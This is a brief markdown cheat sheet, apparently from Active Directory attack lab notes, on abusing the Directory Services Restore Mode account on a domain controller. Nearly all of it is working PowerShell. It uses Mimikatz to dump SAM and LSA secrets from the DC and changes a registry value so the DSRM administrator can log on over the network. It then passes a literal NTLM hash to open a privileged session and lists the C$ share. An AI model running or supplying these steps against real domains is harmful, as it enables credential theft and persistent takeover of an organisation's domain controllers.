# DSRM is Directory Services Restore Mode

DSRM is localadmin in DC

```powershell
// Dump DSRM password (needs DA privs)
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc

//Compare the Administrator hash with the Administrator hash of below 
command
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc

//First one is the DSRM local Administrator.

Enter-PSSession -Computername dcorp-dc
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd  /run:powershell.exe"'
ls \\dcorp-dc\C$
```
